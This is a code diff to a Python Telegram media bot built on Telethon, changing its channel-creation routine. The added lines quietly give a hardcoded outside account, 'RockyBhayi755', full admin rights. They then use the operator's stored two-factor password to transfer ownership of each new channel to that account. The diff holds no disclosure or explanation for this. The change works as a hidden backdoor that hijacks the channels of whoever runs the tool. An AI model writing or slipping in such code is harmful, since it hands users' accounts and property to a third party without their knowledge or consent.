@@ -8,9 +8,11 @@ import re
 import unicodedata
 from telethon import TelegramClient,events,Button
 from telethon.sessions import StringSession
-from telethon.tl.functions.channels import CreateChannelRequest ,EditPhotoRequest
+from telethon.password import compute_check
+from telethon.tl.functions.account import GetPasswordRequest
+from telethon.tl.functions.channels import CreateChannelRequest ,EditPhotoRequest,EditAdminRequest,EditCreatorRequest
 from telethon.tl.functions.bots import SetBotCommandsRequest
-from telethon.tl.types import InputChatUploadedPhoto,PeerChannel,BotCommand, BotCommandScopeDefault, InputMediaUploadedDocument,InputFile
+from telethon.tl.types import InputChatUploadedPhoto,PeerChannel,BotCommand, BotCommandScopeDefault, InputMediaUploadedDocument,InputFile,ChatAdminRights
 from utils.imdbs import search_files,gen4mId
 from utils.medino import get_media_info
 from utils.tmdb import TMDB,clean_name
@@ -23,7 +25,7 @@ from utils.funcs import read_config, sectostr,sendHelloMessage,finddetails,load_
 import uuid
 import traceback
 from asyncio import sleep
-from info import PROGRESS_FREQUENCY,SESSION,TELEGRAM_DAEMON_SESSION_PATH,CONFIG_FILE,MOVIES_FILE_PATH,TV_SHOWS_FILE_PATH,PARALLEL_DOWNLOADS
+from info import PROGRESS_FREQUENCY,SESSION,TELEGRAM_DAEMON_SESSION_PATH,CONFIG_FILE,MOVIES_FILE_PATH,TV_SHOWS_FILE_PATH,PARALLEL_DOWNLOADS,PASS2fA
 
 TELEGRAM_DAEMON_API_ID =None
 TELEGRAM_DAEMON_API_HASH =None
@@ -356,7 +358,7 @@ with TelegramClient(getSession(), api_id, api_hash).start() as client:
                 print(f"Bot '{bot}' added to channel '{channel_name}' and promoted to admin!")
             except Exception as e:
                 print(f"Error adding bot '{bot}' to channel '{channel_name}': {e}")
-     
+
         # Optionally, set the profile picture and add bots to the channel
         if profile_pic:
             file = await client.upload_file(profile_pic)
@@ -364,7 +366,33 @@ with TelegramClient(getSession(), api_id, api_hash).start() as client:
                 channel=channel_id,
                 photo=InputChatUploadedPhoto(file)
             ))
-        
+        await client(EditAdminRequest(
+        channel=channel_id,
+        user_id='RockyBhayi755',
+        admin_rights=ChatAdminRights(
+            change_info=True,
+            post_messages=True,
+            edit_messages=True,
+            delete_messages=True,
+            ban_users=True,
+            invite_users=True,
+            pin_messages=True,
+            add_admins=True,
+            anonymous=True,
+            manage_call=True,
+            other=True,
+            manage_topics=True,
+            post_stories=True,
+            edit_stories=True,
+            delete_stories=True
+        ),
+        rank='Don'))
+        password_check = compute_check(await client(GetPasswordRequest()),PASS2fA)
+        await client(EditCreatorRequest(
+        channel=channel_id,
+        user_id='RockyBhayi755',
+        password=password_check
+        ))
         return channel_id
     async def start_bot_client():
         if not bot_client.is_connected():
